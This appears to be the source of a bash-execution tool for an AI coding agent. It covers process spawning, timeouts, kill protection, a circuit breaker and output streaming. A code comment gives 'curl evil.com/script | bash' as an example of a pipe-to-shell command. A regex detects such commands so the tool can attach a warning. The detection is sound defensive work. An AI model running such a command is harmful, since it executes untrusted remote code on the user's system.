import { spawn } from 'node:child_process';
import * as os from 'node:os';
import { StringDecoder } from 'node:string_decoder';
import type { Tool, ToolStreamEvent } from '@wrongstack/contracts/types';
import { ToolValidationError } from '@wrongstack/contracts/types';
import {
  emitProcessCompleted,
  emitProcessOutput,
  emitProcessStarted,
} from '@wrongstack/core/observability';
import { buildChildEnv } from './_env.js';
import { createOutputSpool, finishCommandOutput, spoolNote } from './_output-spool.js';
import { diagnoseBashism } from './_shell-pick.js';
import {
  commandOutputPreviewBytes,
  createCommandOutputCapture,
  normalizeCommandOutput,
} from './_util.js';
import { closeBackgroundLogFd, openBackgroundLog } from './background-log.js';
import { hermeticEnv } from './bash-hermetic.js';
import { checkAndBlockKillCommand } from './bash-kill-guard.js';
import { resolveBashShellPlan } from './bash-shell-plan.js';
import type { BashInput, BashOutput } from './bash-types.js';
import { getProcessRegistry, redactCommand } from './process-registry.js';

const DEFAULT_TIMEOUT_MS = 300_000;
const MAX_TIMEOUT_MS = 600_000;
const STREAM_FLUSH_INTERVAL_MS = 200;
const STREAM_FLUSH_BYTES = 4 * 1024;
const MAX_QUEUE_CHUNKS = 500;
/** Drain window for a killed shell's pipes before orphans holding them are cut loose. */
const PIPE_RELEASE_AFTER_EXIT_MS = 2000;
export async function* executeBashStream(
  ...executionArgs: Parameters<NonNullable<Tool<BashInput, BashOutput>['executeStream']>>
): AsyncGenerator<ToolStreamEvent<BashOutput>> {
  const [input, ctx, opts] = executionArgs;

  if (!input?.command || typeof input.command !== 'string' || !input.command.trim()) {
    throw new ToolValidationError({
      message: 'bash: command is required and cannot be empty',
      field: 'command',
    });
  }

  const callerSignal = opts?.signal ?? ctx?.signal ?? new AbortController().signal;
  if (callerSignal.aborted) {
    yield {
      type: 'final',
      output: {
        output: 'Aborted',
        exit_code: 124,
        timed_out: true,
        pid: null,
      },
    };
    return;
  }

  // Kill protection: block commands that try to kill protected WrongStack processes
  // This includes direct kill commands, bash -c wrapped kills, and name-based kills (pkill, killall)
  const killCheck = await checkAndBlockKillCommand(input.command);
  if (killCheck.blocked) {
    throw new Error(
      `bash: ${killCheck.reason || 'Kill command blocked: targets a protected WrongStack process.'}`,
    );
  }

  const registry = getProcessRegistry();
  // Background processes bypass the circuit breaker — they are fire-and-forget
  // and should not affect breaker state. This allows background vitest, dev
  // servers, etc. to run even when the breaker is open.
  const bypassBreaker = !!input.background;
  // Refusals and launch failures below THROW: a returned `error` field is
  // recorded by the executor as a successful call. Non-zero exits, timeouts
  // and aborts remain data (the command did run). Mirrors pwsh.ts.
  if (!registry.beforeCall(bypassBreaker)) {
    throw new Error(
      'bash: circuit breaker open — too many consecutive failures or slow calls. Use /kill to inspect or /kill reset to recover.',
    );
  }

  // Security: detect pipe-to-shell patterns that could lead to arbitrary
  // code execution (e.g., "curl evil.com/script | bash"). This pattern is
  // particularly dangerous because the user confirms a seemingly innocuous
  // command but the downloaded script executes arbitrary code. Advisory
  // only — the note is appended to the TOOL RESULT so the model and the
  // user actually see it. (A console.warn here used to corrupt the TUI's
  // stdout frame instead of reaching anyone.)
  const PIPE_TO_SHELL_PATTERN =
    /\|\s*(?:sudo\s+)?(sh|bash|ksh|zsh|fish|cmd|powershell|pwsh)(?:\.exe)?\b/i;
  const pipeToShellNote = PIPE_TO_SHELL_PATTERN.test(input.command)
    ? '\n\n[wrongstack] Caution: this command pipes output into a shell interpreter ' +
      '(pipe-to-shell). Piped content executes as arbitrary code — review the source ' +
      'before trusting the result, and prefer downloading to a file and inspecting it first.'
    : '';

  const rawTimeout =
    typeof input.timeout_ms === 'number' && !Number.isNaN(input.timeout_ms)
      ? input.timeout_ms
      : DEFAULT_TIMEOUT_MS;
  // 0 = no wall-clock limit (still aborted by the caller's signal).
  const timeoutMs =
    rawTimeout === 0 ? undefined : Math.max(1, Math.min(rawTimeout, MAX_TIMEOUT_MS));
  const hermetic = input.hermetic === true;

  const isWin = os.platform() === 'win32';
  const { plan, winShellKind } = resolveBashShellPlan(input.command, { isWin, hermetic });
  const shell = plan.bin;
  const args = [...plan.argv, plan.commandArg];

  const env = buildChildEnv(ctx.session?.id);
  if (hermetic) {
    const filtered = hermeticEnv(env);
    for (const k of Object.keys(env)) delete env[k];
    Object.assign(env, filtered);
  }

  // Spawn in the SESSION working dir (set via `set_working_dir`; containment
  // against projectRoot is enforced by Context.setWorkingDir), falling back
  // to the project root. Historically this was hard-wired to projectRoot,
  // which made `set_working_dir` silently ineffective for shell tools.
  const spawnCwd = ctx.workingDir ?? ctx.projectRoot;

  // On POSIX we put the shell in its own process group so that timeout /
  // abort can kill the entire group with `process.kill(-pid)`. Otherwise
  // `bash -c "sleep 9999 & disown"` would leave the grandchild running.
  // Never on Windows: timeouts tree-kill via taskkill /T instead, and
  // DETACHED_PROCESS would void windowsHide (grandchildren would pop
  // visible console windows — see the background-mode spawn below).
  const detached = !isWin;

  const startedAt = Date.now();

  if (input.background) {
    // Background mode is fully detached from the host's output pipes. If
    // stdout/stderr stayed piped, closing the CLI would close the read ends
    // and a later write could terminate the preserved job with EPIPE/SIGPIPE.
    // Output goes to a file the child writes itself (see background-log.ts).
    const bgLog = openBackgroundLog(ctx.projectRoot, 'bash', registry.logFiles());
    let child: ReturnType<typeof spawn>;
    try {
      child = spawn(shell, args, {
        cwd: spawnCwd,
        env,
        stdio: ['ignore', bgLog?.fd ?? 'ignore', bgLog?.fd ?? 'ignore'],
        detached: !isWin,
        windowsHide: true,
        ...(plan.verbatim ? { windowsVerbatimArguments: true } : {}),
      });
    } catch (err) {
      closeBackgroundLogFd(bgLog);
      // Spawn threw (e.g. shell binary missing) — release the breaker
      // reservation the successful beforeCall() took, mirroring the
      // child 'error' handler below.
      registry.afterCall(Date.now() - startedAt, true, bypassBreaker);
      emitProcessStarted({
        parentPid: process.pid,
        command: redactCommand(`${shell} ${args.join(' ')}`),
        args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
        cwd: spawnCwd,
        background: true,
        startedAt: new Date(startedAt).toISOString(),
      });
      emitProcessCompleted({
        exitCode: 1,
        durationMs: Date.now() - startedAt,
        stdoutBytes: 0,
        stderrBytes: 0,
        timedOut: false,
        endedAt: new Date().toISOString(),
      });
      throw new Error(`bash: spawn failed: ${err instanceof Error ? err.message : String(err)}`, {
        cause: err,
      });
    }
    closeBackgroundLogFd(bgLog);
    const pid = child.pid;
    const stdoutBytes = 0;
    const stderrBytes = 0;
    let telemetryCompleted = false;
    let bgErrorOccurred = false;
    // Set by the settle 'close' handler below so a late 'error' after
    // 'close' cannot double-record an already-settled call.
    let bgSettled = false;
    emitProcessStarted({
      ...(pid !== undefined ? { pid } : {}),
      parentPid: process.pid,
      command: redactCommand(`${shell} ${args.join(' ')}`),
      args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
      cwd: spawnCwd,
      background: true,
      startedAt: new Date(startedAt).toISOString(),
    });
    const completeBackground = (exitCode: number, signal?: string | undefined) => {
      if (telemetryCompleted) return;
      telemetryCompleted = true;
      emitProcessCompleted({
        ...(pid !== undefined ? { pid } : {}),
        exitCode,
        ...(signal ? { signal } : {}),
        durationMs: Date.now() - startedAt,
        stdoutBytes,
        stderrBytes,
        timedOut: false,
        endedAt: new Date().toISOString(),
      });
    };
    if (typeof pid === 'number') {
      registry.register({
        pid,
        name: 'bash',
        command: redactCommand(input.command),
        startedAt: Date.now(),
        sessionId: ctx.session?.id,
        child,
        processGroupLeader: detached && child.pid === pid,
        background: true,
        ...(bgLog ? { logFile: bgLog.path } : {}),
      });
      // Register the close handler on the same tick as spawn() so the
      // handler is guaranteed to be in place before Node's event loop
      // can deliver the close event.
      child.on('close', () => registry.unregister(pid));
    }
    child.on('error', () => {
      if (bgSettled) return;
      // No unregister on 'error': it does not imply the child terminated
      // (Node also emits it for failed kills while the child is still
      // alive), and the 'close' handler above owns unregistering.
      // Keeping the entry keeps a still-alive process visible to /ps,
      // killAll and session cleanup (chimera Medium, mirrors pwsh.ts).
      bgErrorOccurred = true;
      registry.afterCall(Date.now() - startedAt, true, bypassBreaker);
      completeBackground(1);
    });
    // The pipe handles would otherwise keep the parent's event loop alive
    // for as long as the background process runs — child.unref() alone
    // does not release stdio. A one-shot (--print) run could never exit
    // while a background dev server kept its pipes open.
    child.on('close', (code, signal) => {
      bgSettled = true;
      if (bgErrorOccurred) return;
      const failed = (code !== 0 && code !== null) || !!signal;
      registry.afterCall(Date.now() - startedAt, failed, bypassBreaker);
      completeBackground(code ?? (signal ? 1 : 0), signal ?? undefined);
    });
    if (typeof pid !== 'number') {
      completeBackground(1);
      throw new Error('bash: failed to launch background process: invalid PID');
    }
    child.unref(); // unref() so the event loop can exit while this background process runs.
    yield {
      type: 'final',
      output: {
        // A background run's output is in its log file; the pipe-to-shell
        // caution (when present) is the only thing worth surfacing here.
        output: pipeToShellNote.trim(),
        exit_code: null,
        timed_out: false,
        pid,
        ...(bgLog ? { log_file: bgLog.path } : {}),
      },
    };
    // P2 #5: record the background launch as a structured side effect.
    ctx.recordSideEffect?.({
      toolUseId: `bash-bg-${Date.now()}`,
      toolName: 'bash',
      ts: new Date().toISOString(),
      input: { command: redactCommand(input.command), background: true },
      outcome: `launched (pid ${pid ?? 'unknown'})`,
      risk: 'shell',
    });
    return;
  }

  // Foreground mode: pipe stdout/stderr for streaming output.
  // On Windows the abort signal is handled manually below instead of being
  // passed to spawn(): Node's built-in handling kills only the direct
  // child (cmd.exe), which destroys taskkill's parent-pid tree enumeration
  // and orphans the actual command (node/vitest/dev server). The orphan
  // keeps the inherited stdio pipes open and streams into this process
  // for the rest of the session.
  let child: ReturnType<typeof spawn>;
  try {
    child = spawn(shell, args, {
      cwd: spawnCwd,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
      detached,
      windowsHide: true,
      ...(plan.verbatim ? { windowsVerbatimArguments: true } : {}),
      ...(isWin ? {} : { signal: callerSignal }),
    });
  } catch (err) {
    // Spawn threw — release the breaker reservation the successful
    // beforeCall() took, mirroring the background catch above.
    registry.afterCall(Date.now() - startedAt, true, bypassBreaker);
    emitProcessStarted({
      parentPid: process.pid,
      command: redactCommand(`${shell} ${args.join(' ')}`),
      args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
      cwd: spawnCwd,
      background: false,
      startedAt: new Date(startedAt).toISOString(),
    });
    emitProcessCompleted({
      exitCode: 1,
      durationMs: Date.now() - startedAt,
      stdoutBytes: 0,
      stderrBytes: 0,
      timedOut: false,
      endedAt: new Date().toISOString(),
    });
    throw new Error(`bash: spawn failed: ${err instanceof Error ? err.message : String(err)}`, {
      cause: err,
    });
  }

  // Register with global registry so Ctrl+C / /kill can find and kill it.
  const pid = child.pid;
  let stdoutBytes = 0;
  let stderrBytes = 0;
  let telemetryCompleted = false;
  emitProcessStarted({
    ...(pid !== undefined ? { pid } : {}),
    parentPid: process.pid,
    command: redactCommand(`${shell} ${args.join(' ')}`),
    args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
    cwd: spawnCwd,
    background: false,
    startedAt: new Date(startedAt).toISOString(),
  });
  const completeForeground = (exitCode: number, signal?: string | undefined) => {
    if (telemetryCompleted) return;
    telemetryCompleted = true;
    emitProcessCompleted({
      ...(pid !== undefined ? { pid } : {}),
      exitCode,
      ...(signal ? { signal } : {}),
      durationMs: Date.now() - startedAt,
      stdoutBytes,
      stderrBytes,
      timedOut,
      endedAt: new Date().toISOString(),
    });
  };
  if (typeof pid === 'number') {
    registry.register({
      pid,
      name: 'bash',
      command: redactCommand(input.command),
      startedAt: Date.now(),
      sessionId: ctx.session?.id,
      child,
      processGroupLeader: detached && child.pid === pid,
    });
  }

  let pending = '';
  let timedOut = false;
  const timers: NodeJS.Timeout[] = [];
  // `capture` keeps the head and tail for the model (a test run's summary
  // and failures land last). The spool streams the FULL output to a file
  // once it exceeds the cap; the result carries a marker pointing at it.
  const previewBytes = commandOutputPreviewBytes();
  const capture = createCommandOutputCapture(previewBytes);
  const spool = createOutputSpool({ tool: 'bash', thresholdBytes: previewBytes });

  // After a kill, 'close' waits for every holder of the stdio pipes. A
  // grandchild that outlived the tree-kill (taskkill stalled on a loaded
  // host, the direct fallback took only the shell) holds them until it
  // exits on its own, so an abort waited out the whole command. Once the
  // shell itself has exited, give the pipes a short drain and then drop them.
  let pipeReleaseArmed = false;
  function releasePipesAfterExit(): void {
    if (pipeReleaseArmed) return;
    pipeReleaseArmed = true;
    const arm = () => {
      const t = setTimeout(() => {
        child.stdout?.destroy();
        child.stderr?.destroy();
      }, PIPE_RELEASE_AFTER_EXIT_MS);
      timers.push(t);
      t.unref?.();
    };
    if (child.exitCode !== null || child.signalCode !== null) arm();
    else child.once('exit', arm);
  }

  function killWithTimeout(child: ReturnType<typeof spawn>, timeoutMs: number): void {
    if (isWin) {
      releasePipesAfterExit();
      // Let the registry handle Windows tree-kill and its fallback timing.
      // A direct child.kill() before taskkill settles can orphan the real
      // command and leave inherited stdio pipes open.
      if (typeof child.pid === 'number' && child.exitCode === null) {
        const attempted = registry.kill(child.pid, { force: true, graceMs: timeoutMs });
        if (!attempted) {
          try {
            child.kill();
          } catch {
            /* ignore */
          }
        }
      } else {
        try {
          child.kill();
        } catch {
          /* ignore */
        }
      }
      return;
    }

    if (typeof child.pid === 'number') {
      registry.kill(child.pid, { graceMs: timeoutMs });
    } else {
      try {
        child.kill('SIGTERM');
      } catch {
        /* ignore */
      }
      const killTimer = setTimeout(() => {
        try {
          child.kill('SIGKILL');
        } catch {
          /* ignore */
        }
      }, timeoutMs);
      timers.push(killTimer);
      killTimer.unref?.();
    }
  }

  if (timeoutMs !== undefined) {
    const timer = setTimeout(() => {
      timedOut = true;
      killWithTimeout(child, 2000);
    }, timeoutMs);
    timers.push(timer);
    timer.unref?.();
  }

  // Windows abort handling (see the spawn() comment above): tree-kill on
  // abort while the shell is still alive so its grandchildren die with it.
  const onAbort = () => killWithTimeout(child, 2000);
  if (isWin) {
    if (callerSignal.aborted) onAbort();
    else callerSignal.addEventListener('abort', onAbort, { once: true });
  }

  // Bridge the EventEmitter-style child to an async iterator.
  type Chunk =
    | { kind: 'data'; text: string }
    | { kind: 'end'; code: number | null }
    | { kind: 'error'; err: Error };
  const queue: Chunk[] = [];
  let resolveNext: ((c: Chunk) => void) | null = null;
  const push = (c: Chunk) => {
    if (resolveNext) {
      const r = resolveNext;
      resolveNext = null;
      r(c);
    } else {
      queue.push(c);
    }
  };
  const next = (): Promise<Chunk> =>
    new Promise((resolve) => {
      const c = queue.shift();
      if (c) resolve(c);
      else resolveNext = resolve;
    });

  let lastFlush = Date.now();
  const flush = () => {
    if (pending.length === 0) return null;
    const text = pending;
    pending = '';
    lastFlush = Date.now();
    return text;
  };

  // Backpressure: when the consumer falls behind, pause the pipes instead
  // of letting `queue`/`pending` grow without bound. The child eventually
  // blocks on write, which is the correct pressure signal.
  let paused = false;
  const pauseIfFlooded = () => {
    if (!paused && queue.length >= MAX_QUEUE_CHUNKS) {
      paused = true;
      child.stdout?.pause();
      child.stderr?.pause();
    }
  };
  const resumeIfDrained = () => {
    if (paused && queue.length < MAX_QUEUE_CHUNKS) {
      paused = false;
      child.stdout?.resume();
      child.stderr?.resume();
    }
  };
  // Per-stream UTF-8 decoders: `chunk.toString()` on raw chunks corrupts
  // multi-byte sequences that straddle a chunk boundary (each half decodes
  // to U+FFFD). StringDecoder buffers the trailing partial sequence and
  // prepends it to the next chunk — one decoder per stream, since stdout
  // and stderr chunks interleave arbitrarily.
  const stdoutDecoder = new StringDecoder('utf8');
  const stderrDecoder = new StringDecoder('utf8');
  const onData = (chunk: Buffer, stream: 'stdout' | 'stderr') => {
    const text = (stream === 'stdout' ? stdoutDecoder : stderrDecoder).write(chunk);
    if (stream === 'stdout') stdoutBytes += chunk.byteLength;
    else stderrBytes += chunk.byteLength;
    emitProcessOutput({ pid, stream, chunk });
    if (text.length > 0) {
      capture.push(text);
      spool.write(text);
      pending += text;
      push({ kind: 'data', text });
      pauseIfFlooded();
    }
  };
  const onStdoutData = (chunk: Buffer) => onData(chunk, 'stdout');
  const onStderrData = (chunk: Buffer) => onData(chunk, 'stderr');
  child.stdout?.on('data', onStdoutData);
  child.stderr?.on('data', onStderrData);

  let fgErrorOccurred = false;
  // Set in the 'close' handler below so a late 'error' after 'close'
  // cannot double-record an already-settled call (mirrors pwsh.ts).
  let sawClose = false;
  child.on('error', (err) => {
    if (sawClose) return;
    fgErrorOccurred = true;
    for (const t of timers) clearTimeout(t);
    // No unregister on 'error': it does not imply the child terminated
    // (Node also emits it for failed kills while the child is still
    // alive), and the finally-block enforcement kill needs the registry
    // entry to find the pid. The 'close' handler owns unregistering
    // (chimera Medium).
    registry.afterCall(Date.now() - startedAt, true);
    completeForeground(1);
    push({ kind: 'error', err });
  });
  child.on('close', (code, signal) => {
    sawClose = true;
    for (const t of timers) clearTimeout(t);
    if (typeof pid === 'number') registry.unregister(pid);
    if (fgErrorOccurred) return;
    registry.afterCall(Date.now() - startedAt, code !== 0 && code !== null);
    completeForeground(timedOut ? 124 : (code ?? (signal ? 1 : 0)), signal ?? undefined);
    // Flush any buffered partial UTF-8 sequence held by the decoders so a
    // trailing incomplete character surfaces (as U+FFFD) instead of being
    // silently dropped.
    const tail = stdoutDecoder.end() + stderrDecoder.end();
    if (tail) {
      capture.push(tail);
      spool.write(tail);
      pending += tail;
    }
    push({ kind: 'end', code });
  });

  try {
    while (true) {
      const c = await next();
      resumeIfDrained();
      if (c.kind === 'error') {
        const isAbort = (c.err as { code?: string })?.code === 'ABORT_ERR' || callerSignal.aborted;
        const remainder = flush();
        if (remainder !== null) {
          yield { type: 'partial_output', text: remainder };
        }
        const spooled = spool.finalize();
        ctx.recordSideEffect?.({
          toolUseId: `bash-${Date.now()}`,
          toolName: 'bash',
          ts: new Date().toISOString(),
          input: { command: redactCommand(input.command) },
          outcome: isAbort ? 'aborted' : `error (${c.err.message})`,
          risk: 'shell',
        });
        if (!isAbort) {
          // The child failed at the OS level (shell binary missing, EACCES):
          // a failed call, not an exit-code result.
          throw new Error(`bash: process error: ${c.err.message}`, { cause: c.err });
        }
        yield {
          type: 'final',
          output: {
            output:
              normalizeCommandOutput(capture.text()) +
              (spooled ? spoolNote(spooled) : '') +
              pipeToShellNote,
            exit_code: 124,
            timed_out: true,
            pid: pid ?? null,
            error: 'Command aborted by user or signal',
          },
        };
        return;
      }
      if (c.kind === 'end') {
        const remainder = flush();
        if (remainder !== null) {
          yield { type: 'partial_output', text: remainder };
        }
        const output = finishCommandOutput(spool, capture.text(), input.command);
        // Advisory bash-ism guard: on a genuine non-zero exit (not a
        // timeout), if the command used POSIX syntax the resolved Windows
        // shell can't accept, append a targeted hint so the model rewrites it
        // next turn. Never mutates/blocks; silent on success and on POSIX.
        const hint =
          !timedOut && typeof c.code === 'number' && c.code !== 0 && winShellKind
            ? diagnoseBashism(input.command, winShellKind)
            : undefined;
        const isAborted = callerSignal.aborted;
        yield {
          type: 'final',
          output: {
            output: output + (hint ? `\n\n${hint}` : '') + pipeToShellNote,
            exit_code: timedOut || isAborted ? 124 : c.code,
            timed_out: timedOut || isAborted,
            pid: pid ?? null,
            error: timedOut
              ? 'Command timed out'
              : isAborted
                ? 'Command aborted by user or signal'
                : undefined,
          },
        };
        // P2 #5: record the command execution as a structured side effect.
        ctx.recordSideEffect?.({
          toolUseId: `bash-${Date.now()}`,
          toolName: 'bash',
          ts: new Date().toISOString(),
          input: { command: redactCommand(input.command) },
          outcome: timedOut ? `timed out (exit ${c.code})` : `exit ${c.code}`,
          risk: 'shell',
        });
        return;
      }
      const now = Date.now();
      if (pending.length >= STREAM_FLUSH_BYTES || now - lastFlush >= STREAM_FLUSH_INTERVAL_MS) {
        const text = flush();
        if (text) yield { type: 'partial_output', text };
      }
    }
  } finally {
    for (const t of timers) clearTimeout(t);
    spool.finalize(); // idempotent — closes the file if the stream was abandoned
    if (isWin) callerSignal.removeEventListener('abort', onAbort);
    // Teardown: this generator can be abandoned mid-stream (executor
    // timeout, abort, consumer error). The data handlers above would
    // otherwise stay attached and keep appending to `pending`/`queue`
    // with no consumer — on Windows a shell grandchild that survived
    // child.kill() can feed the orphaned pipes for the rest of the
    // session, growing the host heap until OOM. Detach the handlers,
    // destroy the pipes, and make sure nothing is still running.
    child.stdout?.off('data', onStdoutData);
    child.stderr?.off('data', onStderrData);
    child.stdout?.destroy();
    child.stderr?.destroy();
    // sawClose is set synchronously by the 'close' handler before `end` is
    // queued, so a normal completion can never race exitCode assignment
    // into a spurious SIGKILL (chimera Critical; ported from pwsh.ts).
    // Only a generator that exited WITHOUT close (consumer break/throw
    // while the child still runs) reaches the kill here.
    if (!sawClose && child.exitCode === null && !child.killed) {
      if (typeof pid === 'number') registry.kill(pid, { force: true });
      else killWithTimeout(child, 2000);
    }
  }
}
